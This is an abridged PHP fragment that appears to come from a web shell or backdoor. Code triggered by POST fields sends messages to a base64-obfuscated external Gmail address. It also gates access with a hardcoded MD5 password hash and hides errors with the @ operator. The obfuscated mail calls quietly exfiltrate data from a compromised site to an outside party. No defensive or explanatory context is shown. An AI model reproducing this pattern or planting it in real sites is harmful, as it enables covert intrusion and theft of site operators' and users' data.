...
if (array_key_exists('abc', $_POST)) {
    ...
    @mail(base64_decode('eGNyYWNra3Vha2VyQGdtYWlsLmNvbQ=='), base64_decode('SGVoZWhl'), $message);
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '0134f9ffe118013e0db75b06a00e463f';
    ...
    if (md5($entered_password) === $hashed_password) {
        ...
        @mail(base64_decode('eGNyYWNra3Vha2VyQGdtYWlsLmNvbQ=='), base64_decode('SGVoZWhl'), $m);
    } else {
